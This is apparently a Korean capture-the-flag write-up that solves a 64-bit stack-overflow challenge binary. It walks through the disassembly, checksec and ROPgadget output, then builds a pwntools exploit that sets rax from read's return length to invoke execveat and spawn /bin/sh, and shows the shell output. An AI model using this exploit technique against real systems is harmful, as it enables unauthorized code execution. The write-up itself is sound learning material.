# 상준이가 문제 줌#4

![ScreenShot](D:\git\CTF_Writeup\s0ngsaris_study\Homework\image\sc1.JPG)  

---

문제를 풀 때 당시 64bit pwnable은 아직 익숙하지 않았다.  

일단 IDA로 해당 파일을 열어보았다.

```
.text:00000000004000B0                 xor     rax, rax
.text:00000000004000B3                 xor     rbx, rbx
.text:00000000004000B6                 xor     rcx, rcx
.text:00000000004000B9                 xor     rdx, rdx
.text:00000000004000BC                 xor     rdi, rdi
.text:00000000004000BF                 xor     rsi, rsi
.text:00000000004000C2                 xor     r8, r8
.text:00000000004000C5                 xor     r9, r9
.text:00000000004000C8                 xor     r10, r10
.text:00000000004000CB                 xor     r11, r11
.text:00000000004000CE                 xor     r12, r12
.text:00000000004000D1                 xor     r13, r13
.text:00000000004000D4                 xor     r14, r14
.text:00000000004000D7                 xor     r15, r15
.text:00000000004000DA                 xor     rbp, rbp
.text:00000000004000DD                 call    sub_4000F2
.text:00000000004000E2                 mov     eax, 3Ch
.text:00000000004000E7                 xor     rdi, rdi
.text:00000000004000EA                 xor     rsi, rsi
.text:00000000004000ED                 xor     rdx, rdx
.text:00000000004000F0                 syscall
```

젠장 끝이다... 어셈으로 짜여진 파일인것 같다.

우선 xor 연산을 통해 보이는 레지스터의 값을 모두 0으로 만든다

그리고 sub_4000F2 함수를 call 한다. 저기에 뭐가 있는지 봐야겠지?

```
4000f2:       48 81 ec 28 01 00 00    sub    $0x128,%rsp
4000f9:       48 89 e6                mov    %rsp,%rsi
4000fc:       ba 48 01 00 00          mov    $0x148,%edx
400101:       0f 05                   syscall
```

#### ~FUCKING

0x128(296)byte 만큼의 공간을 할당한다 그리고 rsi 레지스터에 해당 값을 넣는다.

그리고 edx(rdx) 에 0x148을 넣는다. 그리고 syscall 을 통해 특정 함수를 호출한다.

자 이제 어떤 함수일까...

먼저 rax 가 0이므로 64bit systemcall number 0인 read 함수가 호출된다.

rdx 또한 0으로 초기화 되어 있고 rsi rdx 에 어떤 값이 들어가는 지 알고 있다.

이걸 대충 C언어로 바꾸면 다음과 같다.

```c
#include <stdio.h>

int main()
{
    read(0, buf, 148);
}
```
혹시 그럴리 없겠지만 syscall number를 모를 경우 디버깅을 통해 확인할 수 있다.

```
RAX  0x0
RBX  0x0
RCX  0x0
RDX  0x148
RDI  0x0
RSI  0x7fffffffe470 ◂— 0x0
R8   0x0
R9   0x0
R10  0x0
R11  0x0
R12  0x0
R13  0x0
R14  0x0
R15  0x0
RBP  0x0
RSP  0x7fffffffe470 ◂— 0x0
RIP  0x400101 ◂— syscall
─────────────────────────────────[ DISASM ]─────────────────────────
  0x4000f2    sub    rsp, 0x128
  0x4000f9    mov    rsi, rsp
  0x4000fc    mov    edx, 0x148
► 0x400101    syscall  <SYS_read>
       fd: 0x0
       buf: 0x7fffffffe470 ◂— 0x0
       nbytes: 0x148
```

흠 우선 풀기 전에 어떤 보호 기법이 적용되어 있는지 확인해볼 필요가 있다.

```
secretpack@ubuntu:~/Desktop$ pwn checksec attackme
[*] '/home/secretpack/Desktop/attackme'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
NX enable 이므로 shellcode를 쓸 수가 없다.

그렇다면 다른 방법을 강구해야 한다. 검색을 하던중 [Sigreturn을 이용한 SROP](https://www.lazenca.net/plugins/servlet/mobile?contentId=16810278#content/view/16810278)와 관련된 문서를 보게 되었다. 이를 시도 했으나 64bit에서 sigreturn 함수의 systemcall number는 15 이다. 방법이 없지는 않겠지만 내가 알고있는 선에서는 이 방법을 사용해 풀 수가 없다는 판결을 내렸다.

그리고 상준이가 문제 해결을 위한 힌트를 줬다.

```
[상준] [오후 9:58] 자
[상준] [오후 9:58] 힌트준다
[상준] [오후 9:58] 64bit에서는
[상준] [오후 9:58] execveat이라는
[상준] [오후 9:58] 엄청난 시스콜이잇다
[상준] [오후 9:59] 한번 검색해서봐라
```

##### 검색해보자!

```c
#include <unistd.h>

int execveat(int dirfd, const char *pathname,
             char *const argv[], char *const envp[], int flags);
```
인자가 엄청 많은데...

manpage 를 잘 읽어보면 이 함수를 사용하여 /bin/sh를 실행할 수 있다.

```c
execveat(0,"/bin/sh",NULL,NULL,0);
```

요롷게 들어가면 쉘이 실행된다고 한다.

혹시나!! ROPGadget을 이용해서 pop rax 가젯이 있는지 먼저 찾아봤다.

```
secretpack@ubuntu:~/Desktop$ ROPgadget --binary attackme
Gadgets information
============================================================
0x0000000000400108 : add byte ptr [rax], al ; ret
0x0000000000400104 : add esp, 0x128 ; ret
0x0000000000400103 : add rsp, 0x128 ; ret
0x000000000040010a : ret
0x0000000000400106 : sub byte ptr [rcx], al ; add byte ptr [rax], al ; ret
0x0000000000400101 : syscall ; add rsp, 0x128 ; ret
```

역시나 없다..

read 함수의 manpage를 읽어보면 read함수는 입력받은 문자열의 길이를 return 한다고 나와있다. 함수의 리턴값은 rax 레지스터에 저장된다. 어??? 이것을 이용하여 공격을 하면 될것 같다.

execveat 함수에 들어가는 rsi는 파일 이름이고 read 함수의 rsi는 입력값이다.
그렇다면 익스플로잇 코드를 작성할때 "/bin/sh\x00"를 앞에 쓰고 그 뒤에 버퍼를 채워주면
실질적인 문자열은 /bin/sh이므로 execveat() 함수의 두번째 인자에 저 문자열을 전달 할 수 있다.

##### 2018.12.19
최종적으로 문제풀이를 완료 했다.
익스플로잇 코드를 작성하였으나 뜻대로 들어가지 않았고 본의 아니게 삽질 했다.
rdx 레지스터가 이상한 값으로 세팅되어 있어서 그랬다...

xor rdx, rdx 를 가져와 문제 풀이에 사용하였고 성공했다.

```python
from pwn import*

p = remote("./attackme")

syscall = 0x400101
zero_rdx = 0x4000ed

payload = "/bin/sh\x00"
# payload += "A" * (0x128 - 8)
payload += "A" * (0x148 - (8 * 4) - 8) # 실제로 ret 부분 앞까지 계산
payload += p64(zero_rdx)
payload += p64(syscall)
payload += "A" * (0x142 - len(payload) - 1) # execveat

p.sendline(payload)
p.interactive()
```
```
secretpack@ubuntu:~/Desktop$ python test.py
[+] Starting local process './attackme': pid 59820
[*] Switching to interactive mode
$ id
uid=1000(secretpack) gid=1000(secretpack) groups=1000(secretpack),4(adm)
$  

```
힘들었다... 당분간은 디버깅 연습을 많이 해야 겠다.
